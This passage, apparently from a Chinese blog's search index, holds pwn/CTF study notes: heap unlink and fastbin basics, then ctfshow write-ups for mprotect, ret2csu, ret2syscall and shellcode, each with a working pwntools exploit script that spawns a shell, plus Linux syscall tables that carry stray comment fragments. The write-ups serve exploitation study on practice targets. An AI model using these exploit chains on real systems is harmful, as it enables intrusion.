那么就很容易触发到unlink了\n具体实现：\nmalloc_consolidate的功能就是把chunk从fastbin取出，相邻的chunk进行合并，并且会设置下一个chunk的prev_inuse位为0。当chunk从fastbin里取出后，我们就可以在再一次free这个chunk了，此时，fastbin里没有形成循环链表，一个chunk在fastbin，一个chunk在unosrted bin（small）。关键的一点是下一个chunk的prev_inuse已经清零，我们将fastbin里的那个chunk申请回来，伪造一个chunk（往fastbin中写，也就是写入了unsortbin中，将fd与bk设为对应的值就可以），然后释放下一个unsorted bin范围的chunk，就会发生unlink。\nadd(1,b&#x27;samll&#x27;)add(2,b&#x27;big&#x27;)free(1)add(3,b&#x27;large&#x27;)free(1)payload = p64(0)+p64(0x21)+p64(small_buf_addr - 0x18) + p64(small_buf_addr - 0x10)+p64(0x20)add(1,payload)free(2)\n\n触发unlink一定要伪造一个free掉的堆块在指针处，因为unlink比较是和头部比较，而数组中存储的是指针的值，所以要伪造头部在指针处才能绕过保护\n","categories":["堆"],"tags":["知识点"]},{"title":"Hello World","url":"/2025/11/17/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"fastbins","url":"/2025/11/17/fastbins/","content":"\nfast bins 的大小范围\n单个 fast bin 管理的块大小\n\n\n每个 fast bin 对应一种固定大小的内存块，块大小按 8 字节递增（32 位系统）或 16 字节递增（64 位系统）。\n\n64 位系统示例（常见场景）：\n\n最小块大小：0x20 字节（包含 16 字节的头部 0x10 + 对齐填充 0x10）。\n\n最大块大小：0x80 字节（即 fastbin_max_size = 0x80，超过此大小的块不属于 fast bins）。\n\n有效大小序列：0x20, 0x30, 0x40, 0x50, 0x60, 0x70, 0x80（共 7 个 fast bin）。\n\n32 位系统示例：\n\n最小块大小：0x10 字节（头部 0x8 + 对齐填充 0x8）。\n\n最大块大小：0x78 字节（fastbin_max_size = 0x78）。\n\n有效大小序列：0x10, 0x18, 0x20, …, 0x78（按 8 字节递增）。\n\n\n\n关键参数\n\n\nfastbin_max_size：定义 fast bins 能管理的最大块大小（64 位系统默认 0x80，32 位系统默认 0x78）。\n块大小计算：块大小需包含头部（prev_size 和 size 字段）和用户数据区，且需按 16 字节对齐（64 位）或 8 字节对齐（32 位）。\n\n问题 1：Fastbins 的 fd 指向谁？Fastbins 采用 LIFO（后进先出） 结构，后释放的堆块会放在链表头部，而 **fd** 指向的是先前被释放的堆块。\n示例：ptr1 = malloc(0x10);ptr2 = malloc(0x10);ptr3 = malloc(0x10);\n\n此时堆结构如下：\n[ ptr1 ]   [ ptr2 ]   [ ptr3 ]\n释放顺序：如果我们按照 free(ptr1) -&gt; free(ptr2) -&gt; free(ptr3) 释放堆块，则 Fastbins 的链表结构如下：\nFastbins 结构（LIFO，头部插入）：\n+---------+       +---------+       +---------+|  ptr3   |-----&gt; |  ptr2   |-----&gt; |  ptr1   |-----&gt; NULL+---------+       +---------+       +---------+  (最近释放)        (第二个释放)        (最早释放)\n\n对应的 fd 指针：\nptr3-&gt;fd = ptr2ptr2-&gt;fd = ptr1ptr1-&gt;fd = NULL\n\nFastbins 结构更新：\n+---------+       +---------+|  ptr2   |-----&gt; |  ptr1   |-----&gt; NULL+---------+       +---------+  (第二个释放)       (最早释放)\n\n再申请一个 malloc(0x10)，ptr2 会被分配：\n+---------+|  ptr1   |-----&gt; NULL+---------+  (最早释放)\n\n再申请一个 malloc(0x10)，ptr1 被分配，Fastbins 变为空。\n完整示意图释放过程：free(ptr1)   free(ptr2)   free(ptr3)   ↓            ↓            ↓+------+     +------+     +------+| ptr1 |     | ptr2 |     | ptr3 |+------+     +------+     +------+\n\nFastbins 变成：\nptr3 -&gt; ptr2 -&gt; ptr1 -&gt; NULL\n分配过程：如果 malloc(0x10)：\n分配 ptr3：ptr2 -&gt; ptr1 -&gt; NULL\n\n再 malloc(0x10)：\n分配 ptr2：ptr1 -&gt; NULL\n\n再 malloc(0x10)：\n分配 ptr1：NULL（Fastbins 为空）\n\n总结：\nFastbins 释放时，后释放的堆块会放在链表头部，而 **fd** 指向的是先前释放的堆块。\nFastbins 申请时，总是优先分配最近释放的堆块（LIFO 规则）\n\n","categories":["堆"],"tags":["知识点"]},{"title":"mprotect函数","url":"/2025/01/24/mprotect%E5%87%BD%E6%95%B0/","content":"一、mprotect() 函数（1）mprotect() 函数简介在二进制漏洞利用（Pwn）中，mprotect() 函数是一个非常重要的系统调用，它用于修改内存区域的访问权限。这在漏洞利用中很有用，例如当你想要在一段原本不可执行的内存区域中执行 shellcode 时，就可以使用 mprotect() 函数将该区域的权限修改为可执行。\n（2）mprotect() 函数的原型#include &lt;sys/mman.h&gt;int mprotect(void *addr, size_t len, int prot);\n\n参数说明：\n\n\n\naddr\nlen\nprot\n\n\n\n修改权限的内存区域的起始地址，该地址必须是系统页大小（通常是 4096 字节）的整数倍\n修改权限的内存区域的长度，单位是字节\n指定新的内存访问权限\n\n\n内存访问权限：\n\n\n\nPROT_READ\nPROT_WRITE\nPROT_EXEC\nPROT_NONE\n\n\n\n允许读取该内存区域\n允许写入该内存区域\n允许执行该内存区域中的代码\n禁止对该内存区域进行任何访问\n\n\n注：一般prot直接修改为7，即可读可写可执行\n二、例题ctfshow49（1）思路我们可以通过栈溢出调用mprotect() 函数，将bss段修改为可读可写可执行，通过read函数将shellcode写入bss段，最后将返回地址改为bss段就可以\n但是mprotect函数需要设置三个参数，我们要找到一个含有三个pop一个ret指令的地址，将原有的参数pop走，再写入新的参数\n我们使用ROPgadge命令找到三个连续的寄存器  ROPgadget –binary pwn  –only “pop|ret”\n\npop_ebx_esi_ebp_ret &#x3D; 0x080a019b\n第一个参数：addr&#x3D;0x80d8000\n第二个参数：len&#x3D;0x1000\n第三个参数：port&#x3D;7\n同样read函数也需要设置三个参数\n在 C 语言里，read 函数的原型如下\n#include &lt;unistd.h&gt;ssize_t read(int fd, void *buf, size_t count);\n\n参数解释：\nfd：文件描述符，用于指定从哪个文件或设备读取数据（0标准输入；1标准输出；2错误输出）\nbuf：指向用于存储读取数据的缓冲区的指针\ncount：期望读取的最大字节数\n第一个参数：fd&#x3D;0\n第二个参数：buf&#x3D;0x80d8000（bss段任意一个地址就可以）\n第三个参数：count&#x3D;0x1000\n（2）expfrom pwn import*elf=ELF(&#x27;./pwn&#x27;)context(os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;, log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28134)mprotect= elf.sym[&#x27;mprotect&#x27;]read = elf.sym[&#x27;read&#x27;]pop_ebx_esi_ebp_ret = 0x080a019bshellcode = asm(shellcraft.sh())               #生成shellcodeaddr=0x80d8000buf=0x80d8000len=0x1000port=7payload = b&#x27;a&#x27;*(0x12+0x4)+p32(mprotect)           #将返回地址设为mprotectpayload += p32(pop_ebx_esi_ebp_ret)+p32(addr)+p32(len)+p32(port)   #设置mprotect的参数payload += p32(read)                              #将mprotect返回地址设为readpayload +=p32(pop_ebx_esi_ebp_ret)+p32(0)+p32(buf)+p32(len)               #设置read的参数payload +=p32(buf)                               #将read的返回地址设为buf（也就是shellcode）io.sendline(payload)io.sendline(shellcode)                            #将shellcode写入bssio.interactive()\n\n","categories":["第二周"],"tags":["wp"]},{"title":"ret2csu","url":"/2025/02/09/ret2csu/","content":"ret2csu的知识点（1）ret2csu的概念ret2csu是一种利用__libc_csu_init函数中的gadget进行ROP链构造的技术，主要用于控制寄存器参数，特别是当程序中缺少足够的gadgets时。这个函数在动态链接的程序中普遍存在，所以适用性较广。当我们做题时我们会发现有些gadget不存在这时我们就可以用ret2csu这种方法\n（2）__libc_csu_init函数__libc_csu_init有两部分我们把这两部分叫gadget2和gadget1\n\n下面这一部分gadget1\n.text:0000000000400716 loc_400716:                             ; CODE XREF: __libc_csu_init+34↑j.text:0000000000400716                 add     rsp, 8.text:000000000040071A                 pop     rbx.text:000000000040071B                 pop     rbp.text:000000000040071C                 pop     r12.text:000000000040071E                 pop     r13.text:0000000000400720                 pop     r14.text:0000000000400722                 pop     r15.text:0000000000400724                 retn\n\n可以看到是将数据弹入到rbx、rbp、r12、r13、r14、r15这六个寄存器中，这样我们就不用找gadget，更重要的是gadget2\n上面一部分是gadget2\n.text:0000000000400700 loc_400700:                             ; CODE XREF: __libc_csu_init+54↓j.text:0000000000400700                 mov     rdx, r13.text:0000000000400703                 mov     rsi, r14.text:0000000000400706                 mov     edi, r15d.text:0000000000400709                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8].text:000000000040070D                 add     rbx, 1.text:0000000000400711                 cmp     rbx, rbp.text:0000000000400714                 jnz     short loc_400700\n\n可以看到是将r13寄存器的值赋值给rdx，r14赋值给rsi，r15赋值给rdi，然后调用函数，这里的rbx是索引寄存器**(设置为0，将r12设置为调用函数的got表地址）*，再往后rbx的值加1，比较rbx与rbp的值，如果rbx不等于 rbp，就跳转到loc_400700处，继续循环，为了避免继续循环我们将rbp的值设置为1，这样就可以跳出循环，继续往下执行也就是gadgets1，loc_400716处，如果不需要再一次控制参数的话，那我们此时把栈中的数据填充56（78）个垃圾数据即可\n注:\n1.如何不执行call\n如果我们仅仅利用__libc_csu_init函数去控制参数，而并不想去用call执行，我们可以call一个空函数（不需要参数，执行之后也不会对程序本身造成任何影响的函数）_term_proc函数（call的是指向_term_proc的地址，不是term_proc的地址）\n2.如何控制rax的值？(修改rax进行系统调用)\n这里就非常巧妙了，可以利用write和read的返回值\n如果读取或写入成功就会将read函数和write函数实际读到和写入的字节数存入rax中，这样就达到了控制rax的值\n如果错误会返回-1，存入errno\n例题ida：\nssize_t x64_ret2libc()&#123;  char buf[128]; // [rsp+0h] [rbp-80h] BYREF  write(1, &quot;Welcome to x64_ret2csu\\n&quot;, 0x17uLL);  return read(0, buf, 300uLL);&#125;\n\nread可以栈溢出(0x80+0x8)\n思路：\n通过栈溢出到gadget1，设值write的参数，返回值设置为gadget2，调用write，打印出write的got表地址，接下来套用模板就可以\n\n\n\nrbx\nrbp\nr12\nr13(rdx)\nr14(rsi)\nr15(rdi)\n\n\n\n0\n1\nwrite_got\n8\nwrite_got\n1\n\n\ngadget1:0x400716\ngadget2:0x400700\nmain:0x040065b\npop_rdi :0x400723\nret = 0x4004c9\nfrom pwn import *context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./ret2csu&#x27;)libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)p = process(&#x27;./ret2csu&#x27;)gadget1 = 0x400716gadget2 = 0x400700write_got = elf.got[&#x27;write&#x27;]main = 0x040065bpop_rdi = 0x400723ret = 0x4004c9rbx = 0rbp = 1r12 = write_gotr13 = 8r14 = write_gotr15 = 1payload = b&#x27;a&#x27;*(0x80+0x8) payload += p64(gadget1)payload += p64(ret)payload += p64(rbx)\tpayload += p64(rbp)\t\tpayload += p64(r12)payload += p64(r13)\t\t\tpayload += p64(r14)\tpayload += p64(r15)\t\t\tpayload += p64(gadget2)payload += p64(0)*7payload += p64(main)p.recvuntil(b&quot;Welcome to x64_ret2csu\\n&quot;)p.send(payload)write_addr = u64(p.recv(8))print(hex(write_addr))libc_base = write_addr - libc.sym[&#x27;write&#x27;]system = libc_base + libc.sym[&#x27;system&#x27;]bin_sh = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))payload = b&#x27;a&#x27;*(0x80+8) +p64(pop_rdi) + p64(bin_sh) + p64(system)p.sendlineafter(b&quot;Welcome to x64_ret2csu\\n&quot;,payload)p.interactive()\n\n","categories":["第四周"],"tags":["wp"]},{"title":"ret2syscall例题","url":"/2025/02/08/ret2syscall%E4%BE%8B%E9%A2%98/","content":"ctfshow72（32位ret2syscall，多系统函数调用）Arch:       i386-32-littleRELRO:      Partial RELROStack:      No canary foundNX:         NX enabledPIE:        No PIE (0x8048000)Stripped:   No\n\n32位，开启NX保护，栈不可执行\nIDA:\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v4; // [esp+10h] [ebp-20h] BYREF  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  puts(&quot;CTFshow-PWN&quot;);  puts(&quot;where is my system?&quot;);  gets(&amp;v4);  puts(&quot;Emmm&quot;);  return 0;&#125;\n\n这道题与上一道题一样，只不过没有”&#x2F;bin&#x2F;sh”字符串，但是有read，我们可以调用read函数，往bss段写入&#x2F;bin&#x2F;sh\n0x08049421 : int 0x80\nread = 0x0806d170\n0x080bb2c6 : pop eax ; ret\n0x0806ecb0 : pop edx ; pop ecx ; pop ebx ; ret\n0x0806F350: int 0x80\nexp：\nfrom pwn import*io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28220)pop_eax_ret = 0x080bb2c6pop_edx_ecx_ebx_ret = 0x0806ecb0int_0x80 = 0x0806F350bss =   0x080EBB29binsh = &quot;/bin/sh\\x00&quot;                         #以空字符 &#x27;\\x00&#x27;作为结束标志的，防止读取后续内存中的数据payload = b&#x27;a&#x27;*(44)+p32(pop_eax_ret)payload += p32(0x3)+p32(pop_edx_ecx_ebx_ret)  #0x3是read函数的系统调用号payload += p32(0x100)+p32(bss)+p32(0)         #read的三个参数payload += p32(int_0x80)payload += p32(pop_eax_ret)+p32(0xb)payload += p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(0)+p32(bss)payload += p32(int_0x80)io.sendline(payload)io.sendline(binsh)io.interactive()\n\n同时因为是静态编译我们可以借助mprotect函数修改bss段的权限\nexp：\nfrom pwn import*elf = ELF(&#x27;./pwn&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28187)mprotect= elf.sym[&#x27;mprotect&#x27;]read = elf.sym[&#x27;read&#x27;]pop_edx_ecx_ebx_ret = 0x0806ecb0bss =   0x080eb000shellcode = asm(shellcraft.sh())payload = b&#x27;a&#x27;*(44)+p32(mprotect)           payload += p32(pop_edx_ecx_ebx_ret)+p32(bss)+p32(0x100)+p32(7)    #mprotect参数payload += p32(read) payload +=p32(bss)                            payload += p32(0)+p32(bss)+p32(0x100)                             #read参数                 io.sendline(payload)io.sendline(shellcode)                            io.interactive()\n\n\n\nctfshow78（64位ret2syscall，多系统函数调用）Arch:       amd64-64-littleRELRO:      Partial RELROStack:      No canary foundNX:         NX enabledPIE:        No PIE (0x400000)Stripped:   No\n\n64位NX保护开启\nint __fastcall main(int argc, const char **argv, const char **envp)&#123;  char v4[80]; // [rsp+0h] [rbp-50h] BYREF  setvbuf(stdout, 0LL, 2LL, 0LL);  setvbuf(stdin, 0LL, 1LL, 0LL);  puts(&quot;CTFshowPWN!&quot;);  puts(&quot;where is my system_x64?&quot;);  gets(v4);  puts(&quot;fuck&quot;);  return 0;&#125;\n\ngets函数可以栈溢出（0x58）这道题与ctfshow72一样，没有bin&#x2F;sh字符串，需要借助read写入\n0x000000000046b9f8 : pop rax ; ret\n0x00000000004016c3 : pop rdi ; ret\n0x00000000004377f9 : pop rdx ; pop rsi ; ret\nsyscall = 0x45BAC5\nexp：\nfrom pwn import *context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28200)#io = process(&#x27;./pwn&#x27;)rax_ret = 0x046b9f8rdi_ret = 0x04016c3rdx_rsi_ret =0x4377f9syscall = 0x45BAC5bss = 0x06C1DE3  binsh = b&quot;/bin/sh\\x00&quot;payload = b&#x27;a&#x27;*(0x58)+p64(rax_ret)+p64(0x0)payload += p64(rdi_ret)+p64(0)payload += p64(rdx_rsi_ret)+p64(0x100)+p64(bss)+p64(syscall)payload += p64(rax_ret)+p64(0x3b)payload += p64(rdi_ret)+p64(bss)payload += p64(rdx_rsi_ret)+p64(0)+p64(0)+p64(syscall)#gdb.attach(io)io.sendline(payload)io.send(binsh)io.interactive()\n\n这道题也可以借助mprotect来修改bss段权限\nfrom pwn import *context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28191)elf = ELF(&#x27;./pwn&#x27;)rdi_ret = 0x04016c3rdx_rsi_ret =0x4377f9bss = 0x6c1c40 read =elf.sym[&#x27;read&#x27;]mprotect =elf.sym[&#x27;mprotect&#x27;]shellcode = asm(shellcraft.sh())payload = b&#x27;a&#x27;*(0x58)payload += p64(rdi_ret)+p64(0x6c1000)      payload += p64(rdx_rsi_ret)+p64(7)+p64(0x1000)+p64(mprotect)payload += p64(rdi_ret)+p64(0)payload += p64(rdx_rsi_ret)+p64(0x1000)+p64(bss)+p64(read)+p64(bss)io.sendline(payload)io.send(shellcode)io.interactive()\n\n","categories":["第四周"],"tags":["wp"]},{"title":"ret2syscall知识点","url":"/2025/02/07/ret2syscall%E7%9F%A5%E8%AF%86%E7%82%B9/","content":"ret2syscall 原理当程序是静态编译时，我们可以通过强制程序执行一个系统调用（syscall）来获得shell\n（1）系统调用基础系统调用是操作系统提供给用户程序的一组接口，用于访问操作系统内核的功能。在 Linux 系统中，常见的系统调用包括文件操作（如 open、read、write）、进程管理（如 fork、execve）、内存管理（如 mmap）等。当用户程序需要执行特权操作时，会通过系统调用陷入内核态，由内核执行相应的操作，并将结果返回给用户程序。\n（2）系统调用过程1.设置系统调用号\n用户程序若要发起系统调用，首先要确定所需调用的系统调用对应的编号，并将其存放在 eax 寄存器中（32位）或rax寄存器中（64位）\n系统调用号是操作系统为每个系统调用分配的一个唯一的整数值标识符。用户程序在发起系统调用时，需要通过这个系统调用号来告知操作系统具体要执行哪一个系统调用，ret2syscall通常采用execve（在当前进程的上下文中执行一个新的程序），32位（0x0b）、64位（0x3b）\nLinux 32 位系统exit 1fork 2read 3write 4open 5close 6waitpid 7creat 8link 9unlink 10execve 11chdir 12time 13mknod 14chmod 15lchown 16break 17oldstat 18lseek 19getpid 20mount 21umount 22setuid 23getuid 24stime 25ptrace 26alarm 27oldfstat 28pause 29utime 30stty 31gtty 32access 33nice 34ftime 35sync 36kill 37rename 38mkdir 39rmdir 40dup 41pipe 42times 43prof 44brk 45setgid 46getgid 47signal 48geteuid 49getegid 50acct 51umount2 52lock 53ioctl 54fcntl 55mpx 56setpgid 57ulimit 58oldolduname 59umask 60chroot 61ustat 62dup2 63getppid 64getpgrp 65setsid 66sigaction 67sgetmask 68ssetmask 69setreuid 70setregid 71sigsuspend 72sigpending 73sethostname 74setrlimit 75getrlimit 76getrusage 77gettimeofday 78settimeofday 79getgroups 80setgroups 81select 82symlink 83oldlstat 84readlink 85uselib 86swapon 87reboot 88readdir 89mmap 90munmap 91truncate 92ftruncate 93fchmod 94fchown 95getpriority 96setpriority 97profil 98statfs 99fstatfs 100ioperm 101socketcall 102syslog 103setitimer 104getitimer 105stat 106lstat 107fstat 108olduname 109iopl 110vhangup 111idle 112vm86old 113wait4 114swapoff 115sysinfo 116ipc 117fsync 118sigreturn 119clone 120setdomainname 121uname 122modify_ldt 123adjtimex 124mprotect 125sigprocmask 126create_module 127init_module 128delete_module 129get_kernel_syms 130quotactl 131getpgid 132fchdir 133bdflush 134sysfs 135personality 136afs_syscall 137setfsuid 138setfsgid 139_llseek 140getdents 141_newselect 142flock 143msync 144readv 145writev 146getsid 147fdatasync 148_sysctl 149mlock 150munlock 151mlockall 152munlockall 153sched_setparam 154sched_getparam 155sched_setscheduler 156sched_getscheduler 157sched_yield 158sched_get_priority_max 159sched_get_priority_min 160sched_rr_get_interval 161nanosleep 162mremap 163setresuid 164getresuid 165vm86 166query_module 167poll 168nfsservctl 169setresgid 170getresgid 171prctl 172rt_sigreturn 173rt_sigaction 174rt_sigprocmask 175rt_sigpending 176rt_sigtimedwait 177rt_sigqueueinfo 178rt_sigsuspend 179pread64 180pwrite64 181chown 182getcwd 183capget 184capset 185sigaltstack 186sendfile 187getpmsg 188putpmsg 189vfork 190ugetrlimit 191mmap2 192truncate64 193ftruncate64 194stat64 195lstat64 196fstat64 197lchown32 198getuid32 199getgid32 200geteuid32 201getegid32 202setreuid32 203setregid32 204getgroups32 205setgroups32 206fchown32 207setresuid32 208getresuid32 209setresgid32 210getresgid32 211chown32 212setuid32 213setgid32 214setfsuid32 215setfsgid32 216pivot_root 217mincore 218madvise 219madvise1 219getdents64 220fcntl64 221gettid 224readahead 225setxattr 226lsetxattr 227fsetxattr 228getxattr 229lgetxattr 230fgetxattr 231listxattr 232llistxattr 233flistxattr 234removexattr 235lremovexattr 236fremovexattr 237tkill 238sendfile64 239futex 240sched_setaffinity 241sched_getaffinity 242set_thread_area 243get_thread_area 244io_setup 245io_destroy 246io_getevents 247io_submit 248io_cancel 249fadvise64 250exit_group 252lookup_dcookie 253epoll_create 254epoll_ctl 255epoll_wait 256remap_file_pages 257set_tid_address 258timer_create 259timer_settime 260timer_gettime 261timer_getoverrun 262timer_delete 263clock_settime 264clock_gettime 265clock_getres 266clock_nanosleep 267statfs64 268fstatfs64 269tgkill 270utimes 271fadvise64_64 272vserver 273mbind 274get_mempolicy 275set_mempolicy 276mq_open 277mq_unlink 278mq_timedsend 279mq_timedreceive 280mq_notify 281mq_getsetattr 282kexec_load 283waitid 284sys_setaltroot 285add_key 286request_key 287keyctl 288ioprio_set 289ioprio_get 290inotify_init 291inotify_add_watch 292inotify_rm_watch 293migrate_pages 294openat 295mkdirat 296mknodat 297fchownat 298futimesat 299fstatat64 300unlinkat 301renameat 302linkat 303symlinkat 304readlinkat 305fchmodat 306faccessat 307pselect6 308ppoll 309unshare 310set_robust_list 311get_robust_list 312splice 313sync_file_range 314tee 315vmsplice 316move_pages 317getcpu 318epoll_pwait 319utimensat 320signalfd 321timerfd_create 322eventfd 323fallocate 324timerfd_settime 325timerfd_gettime 326signalfd4 327eventfd2 328epoll_create1 329dup3 330pipe2 331inotify_init1 332preadv 333pwritev 334rt_tgsigqueueinfo 335perf_event_open 336recvmmsg 337fanotify_init 338 fanotify_mark 339 prlimit64 340 name_to_handle_at 341 open_by_handle_at 342 clock_adjtime 343 syncfs 344sendmmsg 345set_ns 346 process_vm_readv 347process_vm_writev 348\n\n\n\nLinux 64 位系统read 0write 1open 2close 3stat 4fstat 5lstat 6poll 7lseek 8mmap 9mprotect 10munmap 11brk 12rt_sigaction 13rt_sigprocmask 14rt_sigreturn 15ioctl 16pread64 17pwrite64 18readv 19writev 20access 21pipe 22select 23sched_yield 24mremap 25msync 26mincore 27madvise 28shmget 29shmat 30shmctl 31dup 32dup2 33pause 34nanosleep 35getitimer 36alarm 37setitimer 38getpid 39sendfile 40socket 41connect 42accept 43sendto 44recvfrom 45sendmsg 46recvmsg 47shutdown 48bind 49listen 50getsockname 51getpeername 52socketpair 53setsockopt 54getsockopt 55clone 56fork 57vfork 58execve 59exit 60wait4 61kill 62uname 63semget 64semop 65semctl 66shmdt 67msgget 68msgsnd 69msgrcv 70msgctl 71fcntl 72flock 73fsync 74fdatasync 75truncate 76ftruncate 77getdents 78getcwd 79chdir 80fchdir 81rename 82mkdir 83rmdir 84creat 85link 86unlink 87symlink 88readlink 89chmod 90fchmod 91chown 92fchown 93lchown 94umask 95gettimeofday 96getrlimit 97getrusage 98sysinfo 99times 100ptrace 101getuid 102syslog 103y end the stuff that never runs during the benchmarks */getgid 104setuid 105setgid 106geteuid 107getegid 108setpgid 109getppid 110getpgrp 111setsid 112setreuid 113setregid 114getgroups 115setgroups 116setresuid 117getresuid 118setresgid 119getresgid 120getpgid 121setfsuid 122setfsgid 123getsid 124capget 125capset 126rt_sigpending 127rt_sigtimedwait 128rt_sigqueueinfo 129rt_sigsuspend 130sigaltstack 131utime 132mknod 133d for a.out */uselib 134personality 135ustat 136statfs 137fstatfs 138sysfs 139getpriority 140setpriority 141sched_setparam 142sched_getparam 143sched_setscheduler 144sched_getscheduler 145sched_get_priority_max 146sched_get_priority_min 147sched_rr_get_interval 148mlock 149munlock 150mlockall 151munlockall 152vhangup 153modify_ldt 154pivot_root 155_sysctl 156prctl 157arch_prctl 158adjtimex 159setrlimit 160chroot 161sync 162acct 163settimeofday 164mount 165umount2 166swapon 167swapoff 168reboot 169sethostname 170setdomainname 171iopl 172ioperm 173create_module 174init_module 175delete_module 176get_kernel_syms 177query_module 178quotactl 179nfsservctl 180or LiS/STREAMS */getpmsg 181putpmsg 182or AFS */afs_syscall 183or tux */tuxcall 184security 185gettid 186readahead 187setxattr 188lsetxattr 189fsetxattr 190getxattr 191lgetxattr 192fgetxattr 193listxattr 194llistxattr 195flistxattr 196removexattr 197lremovexattr 198fremovexattr 199tkill 200time 201futex 202sched_setaffinity 203sched_getaffinity 204set_thread_area 205io_setup 206io_destroy 207io_getevents 208io_submit 209io_cancel 210get_thread_area 211lookup_dcookie 212epoll_create 213epoll_ctl_old 214epoll_wait_old 215remap_file_pages 216getdents64 217set_tid_address 218restart_syscall 219semtimedop 220fadvise64 221timer_create 222timer_settime 223timer_gettime 224timer_getoverrun 225timer_delete 226clock_settime 227clock_gettime 228clock_getres 229clock_nanosleep 230exit_group 231epoll_wait 232epoll_ctl 233tgkill 234utimes 235vserver 236mbind 237set_mempolicy 238get_mempolicy 239mq_open 240mq_unlink 241mq_timedsend 242mq_timedreceive 243mq_notify 244mq_getsetattr 245kexec_load 246waitid 247add_key 248request_key 249keyctl 250ioprio_set 251ioprio_get 252inotify_init 253inotify_add_watch 254inotify_rm_watch 255migrate_pages 256openat 257mkdirat 258mknodat 259fchownat 260futimesat 261newfstatat 262unlinkat 263renameat 264linkat 265symlinkat 266readlinkat 267fchmodat 268faccessat 269pselect6 270ppoll 271unshare 272set_robust_list 273get_robust_list 274splice 275tee 276sync_file_range 277vmsplice 278move_pages 279utimensat 280ORE_getcpu /* implemented as a vsyscall */epoll_pwait 281signalfd 282timerfd_create 283eventfd 284fallocate 285timerfd_settime 286timerfd_gettime 287accept4 288signalfd4 289eventfd2 290epoll_create1 291dup3 292pipe2 293inotify_init1 294preadv 295pwritev 296rt_tgsigqueueinfo 297perf_event_open 298recvmmsg 299fanotify_init 300fanotify_mark 301prlimit64 302name_to_handle_at 303open_by_handle_at 304clock_adjtime 305syncfs 306sendmmsg 307set_ns 308get_cpu 309process_vm_readv 310process_vm_writev 311\n\n2.传递参数\n32位系统所需参数依次存放在 寄存器eax、ebx、ecx、edx、esi、edi 和 ebp \n\n\n\n设置 eax 寄存器\n设置 edx 寄存器\n设置 ecx 寄存器\n设置 ebx 寄存器\n\n\n\n0xb(execve 的系统调用号)\n0（NULL）\n0(NULL)\n/bin/sh 字符串的地址\n\n\n64位系统所需参数依次存放在寄存器rax、rdi、rsi、rdx、r10、r8 和 r9 \n\n\n\n设置 rax 寄存器\n设置 rdx 寄存器\n设置 rsi 寄存器\n设置 rdi 寄存器\n\n\n\n0x3b(execve 的系统调用号)\n0（NULL）\n0(NULL)\n/bin/sh 字符串的地址\n\n\n3.触发系统调用\n32 位系统使用 int0x80 指令来触发系统调用，64 位系统使用 syscall 指令来触发系统调用\n例题ctfshow71（32位ret2syscall）Arch:       i386-32-littleRELRO:      Partial RELROStack:      No canary foundNX:         NX enabledPIE:        No PIE (0x8048000)Stripped:   NoDebuginfo:  Yes\n\n32位，开启NX保护，栈不可执行\npwn: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped\nstatically linked静态编译\nida：\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v4; // [esp+1Ch] [ebp-64h] BYREF  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  puts(&quot;===============CTFshow--PWN===============&quot;);  puts(&quot;Try to use ret2syscall!&quot;);  gets(&amp;v4);  return 0;\n\ngets栈溢出\n偏移：112\n0x080bb196 : pop eax ; ret\n0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret\n0x080be408 : /bin/sh\n0x08049421 : int 0x80\nexp：\nfrom pwn import*io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28306)pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90int_0x80 = 0x08049421binsh = 0x80be408payload = b&#x27;a&#x27;*(112)+p32(pop_eax_ret)               payload += p32(0xb)+p32(pop_edx_ecx_ebx_ret)   #系统调用号payload += p32(0)+p32(0)+p32(binsh)            #三个参数payload += p32(int_0x80)                       #触发系统调用io.sendline(payload)io.interactive()\n","categories":["第四周"],"tags":["知识点"]},{"title":"shellcode（ctfshow58-64）","url":"/2025/01/30/shellcode1/","content":"ctfshow58Arch:       i386-32-little   RELRO:      Partial RELRO   Stack:      No canary found   NX:         NX unknown - GNU_STACK missing   PIE:        No PIE (0x8048000)   Stack:      Executable   RWX:        Has RWX segments   Stripped:   No\n\n32位程序，NX保护没开，栈可以执行\nida：main函数调用了ctfshow函数\nadd     esp, 10hsub     esp, 0Chlea     eax, [ebp+s]push    eax             ; scall    ctfshow\n\nctfshow函数\nint __cdecl ctfshow(char *s)&#123;  gets(s);  return puts(s);&#125;\n\n存在gets函数栈溢出，并且gets函数写入的地址 [ebp+s] 在后面会被调用，且栈可以执行，所以我们直接写入shellcode就可以\ncall    _getsadd     esp, 10hsub     esp, 0Chpush    [ebp+s]\n\nadd     esp, 10hlea     eax, [ebp+s]call    eax\n\nexp:\nfrom pwn import*context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28158)shellcode = 